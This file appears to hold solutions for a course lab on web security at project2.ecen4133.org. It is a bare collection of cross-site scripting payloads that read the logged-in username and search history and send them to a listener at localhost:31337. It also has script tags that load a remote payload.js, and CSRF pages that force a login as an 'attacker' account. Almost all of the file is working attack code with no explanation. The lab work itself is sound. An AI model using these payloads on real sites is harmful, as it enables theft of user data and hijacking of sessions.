<script>alert("yodobashi camera")</script>

<script>
  $(function() {
    var username = window.document.getElementById("logged-in-user").innerHTML;
    var last_search = window.document.getElementsByClassName("history-item list-group-item")[1].innerHTML;
    $.get("http://localhost:31337/?stolen_user=" + username + "&last_search=" + last_search);
  });
</script>

<script>
  $(function() {
    var username = window.document.getElementById(`logged-in-user`).innerHTML;
    var last_search = window.document.getElementsByClassName(`history-item list-group-item`)[1].innerHTML;
    $.get(`http://localhost:31337/?stolen_user=` + username + `&last_search=` + last_search);
  });
</script>
      
<IMG SRC=/ onerror=
    $.get('https://project2.ecen4133.org/search?xssdefense=0', function (data) {
        re = /<span id="logged-in-user">.*<\/span>/;
        var username = re.exec(data)[0].replace('<span id="logged-in-user">', '').replace('<\/span>', '');

        re = /<a href="search\?q=.*<\/a>/m;
        var last_search = re.exec(data)[0].replace(/<a href="search\?q=.*class="history-item list-group-item">/m, '').replace('<\/a>', '');

        $.get('http://localhost:31337/?stolen_user=' + username + '&last_search=' + last_search);
    });
></img>

<IMG SRC=https://combinatronics.com/miyo6032/Computer-Security/master/Project%202/payload.js></img>

<SCRIPT SRC="https://combinatronics.com/miyo6032/Computer-Security/master/Project%202/payload.js"></SCRIPT>

<html>
    <body>
        <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
        <script>
            $(function() {
                console.log("sending...");
                $.post("https://project2.ecen4133.org/login?csrfdefense=0&xssdefense=4&", { username: "attacker", password: "l33th4x" });
            });
        </script>
    </body>
</html>

<html>
    <body>
        <form id="data" action="https://project2.ecen4133.org/login?csrfdefense=0&xssdefense=4" method="POST">
            <input type="hidden" name="username" value="attacker" />
            <input type="hidden" name="password" value="l33th4x" />
        </form>
        <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
        <script>
            $(function() {
                console.log("sending...");
                $.ajax({
                    type: "post",
                    url: "https://project2.ecen4133.org/login?csrfdefense=0&xssdefense=4", 
                    data: $('#data').serialize(),
                    success: function (data) {
                        console.log(data);
                    }, 
                    dataType: "script"});
            });
        </script>
    </body>
</html>

<html>
    <body>
        <form action="https://project2.ecen4133.org/login?csrfdefense=0&xssdefense=4" method="POST">
            <input type="hidden" name="username" value="attacker" />
            <input type="hidden" name="password" value="l33th4x" />
        </form>
        <script>
            document.forms[0].submit();
        </script>
    </body>
</html>